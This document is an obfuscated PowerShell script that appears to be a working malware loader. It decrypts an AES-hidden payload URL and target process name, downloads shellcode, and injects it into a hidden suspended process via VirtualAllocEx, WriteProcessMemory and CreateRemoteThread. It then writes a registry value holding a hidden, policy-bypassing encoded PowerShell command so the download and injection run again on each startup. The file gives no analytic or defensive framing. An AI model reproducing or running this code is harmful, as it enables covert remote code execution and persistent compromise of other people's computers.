[System.Threading.Thread]::CurrentThread.CurrentCulture = [System.Globalization.CultureInfo]::InvariantCulture
[System.Threading.Thread]::CurrentThread.CurrentUICulture = [System.Globalization.CultureInfo]::InvariantCulture
$ErrorActionPreference = ("{1}{2}{0}"-f 'ue','SilentlyCon','tin')

function fnCalc {
    $seg = 100
    $inc = 4.0 / $seg
    $acc = 0.0
    for ($i = 0; $i -lt $seg; $i++) {
        $x = $i * $inc
        $acc += ($x * $x) * $inc
    }
    $dPart = 12.0
    $sum = $acc + $dPart
    return [math]::Round($sum, 5).ToString().Replace('.', '')
}

$lineA = ("{7}{2}{3}{6}{0}{5}{4}{1}" -f'_','_revo_spmuj_xof','d_y','za','t','eh','l','go')
$lineB = ("{3}{2}{1}{0}"-f'_','b_kciuq','wor','_n')
$lineC = "eht"
$all = $lineA + $lineB + $lineC

function fnKey($calcVal, $ss) {
    $combo = $calcVal + $ss
    if ($combo.Length -lt 16) { $combo += "0" * (16 - $combo.Length) }
    return [Text.Encoding]::UTF8.GetBytes($combo.Substring(0, 16))
}

$z = fnCalc
$k = fnKey $z $all
$v = New-Object Byte[](16)

function fnDec {
    param(
        [string]$c,
        [byte[]]$kk,
        [byte[]]$iv
    )
    [byte[]]$raw = [Convert]::FromBase64String($c)
    $aes = New-Object System.Security.Cryptography.AesManaged
    $aes.Key = $kk
    $aes.IV = $iv
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $dec = $aes.CreateDecryptor()
    [byte[]]$out = $dec.TransformFinalBlock($raw, 0, $raw.Length)
    $aes.Dispose()
    return [Text.Encoding]::UTF8.GetString($out)
}

$a1 = ("{8}{0}{20}{11}{19}{9}{6}{5}{10}{17}{14}{2}{4}{3}{15}{12}{1}{7}{13}{18}{21}{16}" -f 'U','R+olyl','KM','V','AYtj','4','GM6hJ','/P','abS53','v','seE','mAg9vCxjF','/oNgHraeQz8','j6fr9t4lbg','fk','KAph','nz2bk=','OUOuzpIoFY7F','1ZKMALwTSx','w9mYKX','u','JTFBO8')
$a2 = ("{2}{23}{12}{13}{11}{14}{1}{16}{8}{9}{7}{21}{19}{18}{22}{4}{0}{17}{3}{15}{6}{10}{5}{20}"-f'q','w7LN','/l','lK','guXgTl21hS','w','dFHR','xHFEEZJFHPw2D','k6E5','J','4L','hBfXcB','lk3l','qm2','Cc','qpJ','V','jMx6','JK','XwiJrO9jk','/Mw==','b','lNO','2')
$a3 = ("{1}{5}{4}{3}{7}{0}{6}{2}" -f'oC','bzuv8ugf2V0kPjuOq','tx7U=','I+TfU','c','DSHhxS','Rfn85US','W')
$a4 = ("{2}{7}{3}{9}{11}{0}{1}{4}{6}{8}{10}{5}"-f 'gqdL7r','s2PA','IdXvhx','9z9','V','o=','bCA9','gCU','jhg7k3','pi','ohxiz','uR')

try {
    $u  = fnDec -c $a1 -kk $k -iv $v  
    $rp = fnDec -c $a2 -kk $k -iv $v 
    $px = fnDec -c $a3 -kk $k -iv $v  
    $rv = fnDec -c $a4 -kk $k -iv $v  
} catch {
    return
}

Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
public class xR {
    [DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Auto)]
    public static extern bool CreateProcess(
        string lpApplicationName, 
        string lpCommandLine,
        IntPtr lpProcessAttributes, 
        IntPtr lpThreadAttributes, 
        bool bInheritHandles,
        uint dwCreationFlags, 
        IntPtr lpEnvironment, 
        string lpCurrentDirectory,
        ref SI lpStartupInfo, 
        out PI lpProcessInformation
    );
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr VirtualAllocEx(
        IntPtr hProcess, 
        IntPtr lpAddress,
        uint dwSize, 
        uint flAllocationType, 
        uint flProtect
    );
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool WriteProcessMemory(
        IntPtr hProcess, 
        IntPtr lpBaseAddress, 
        byte[] lpBuffer, 
        int nSize, 
        out IntPtr lpNumberOfBytesWritten
    );
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr CreateRemoteThread(
        IntPtr hProcess, 
        IntPtr lpThreadAttributes, 
        uint dwStackSize, 
        IntPtr lpStartAddress, 
        IntPtr lpParameter, 
        uint dwCreationFlags, 
        out IntPtr lpThreadId
    );
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern uint ResumeThread(IntPtr hThread);
    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Auto)]
    public struct SI {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }
    [StructLayout(LayoutKind.Sequential)]
    public struct PI {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }
    public static bool zQ(byte[] pl, string tx) {
        SI si = new SI();
        si.cb = (uint)Marshal.SizeOf(si);
        si.dwFlags = 0x00000001;
        si.wShowWindow = 0;
        PI pi = new PI();
        uint cf = 0x08000000 | 0x4; 
        bool ok = CreateProcess(tx, null, IntPtr.Zero, IntPtr.Zero, false, cf, IntPtr.Zero, null, ref si, out pi);
        if(!ok) return false;
        IntPtr addr = VirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)pl.Length, 0x3000, 0x40);
        if(addr == IntPtr.Zero) return false;
        IntPtr tmp;
        bool wr = WriteProcessMemory(pi.hProcess, addr, pl, pl.Length, out tmp);
        if(!wr || (int)tmp != pl.Length) return false;
        IntPtr thrId;
        IntPtr thr = CreateRemoteThread(pi.hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, out thrId);
        if(thr == IntPtr.Zero) return false;
        ResumeThread(pi.hThread);
        return true;
    }
}
"@

try {
    $wc = New-Object System.Net.WebClient
    [byte[]]$payload = $wc.DownloadData($u)
    if ($payload -and $payload.Length -gt 0) {
        [xR]::zQ($payload, $px) | Out-Null
    }
} catch {
    return
}

$st = @'
param([string]$u, [string]$p)
try {
  $wc = New-Object System.Net.WebClient
  [byte[]]$b = $wc.DownloadData($u)
  Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
public class xR {
    [DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Auto)]
    public static extern bool CreateProcess(string a, string c, IntPtr pa, IntPtr ta, bool i, uint f, IntPtr e, string d, ref SI si, out PI pi);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hp, IntPtr a, uint s, uint t, uint p);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool WriteProcessMemory(IntPtr hp, IntPtr ba, byte[] buf, int n, out IntPtr wr);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hp, IntPtr attr, uint st, IntPtr sa, IntPtr pr, uint fl, out IntPtr t2);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern uint ResumeThread(IntPtr hT);
    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Auto)]
    public struct SI {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }
    [StructLayout(LayoutKind.Sequential)]
    public struct PI {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }
    public static bool zQ(byte[] pl, string tx) {
        SI si = new SI();
        si.cb = (uint)System.Runtime.InteropServices.Marshal.SizeOf(si);
        si.dwFlags = 0x00000001;
        si.wShowWindow = 0;
        PI pi = new PI();
        uint cf = 0x08000000 | 0x4;
        bool ok = CreateProcess(tx, null, IntPtr.Zero, IntPtr.Zero, false, cf, IntPtr.Zero, null, ref si, out pi);
        if(!ok) return false;
        IntPtr addr = VirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)pl.Length, 0x3000, 0x40);
        if(addr == IntPtr.Zero) return false;
        IntPtr wr;
        bool w2 = WriteProcessMemory(pi.hProcess, addr, pl, pl.Length, out wr);
        if(!w2 || (int)wr != pl.Length) return false;
        IntPtr tid;
        IntPtr thr = CreateRemoteThread(pi.hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, out tid);
        if(thr == IntPtr.Zero) return false;
        ResumeThread(pi.hThread);
        return true;
    }
}
"@
  [xR]::zQ($b, $p) | Out-Null
} catch {}
'@

$stB64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($st))
$rcmd = ('p'+'o'+'wershell.ex'+'e '+'-NoPr'+'o'+'file '+'-Wind'+'ow'+'S'+'tyle '+'H'+'idden'+' '+'-E'+'xecu'+'tionPoli'+'cy '+'B'+'yp'+'ass '+'-En'+'co'+'dedCom'+'man'+'d '+"$stB64 "+'-u'+' '+"`"$u`" "+'-'+'p '+"`"$px`"")

try {
    New-ItemProperty -Path $rp -Name $rv -Value $rcmd -PropertyType String -Force | Out-Null
} catch {}
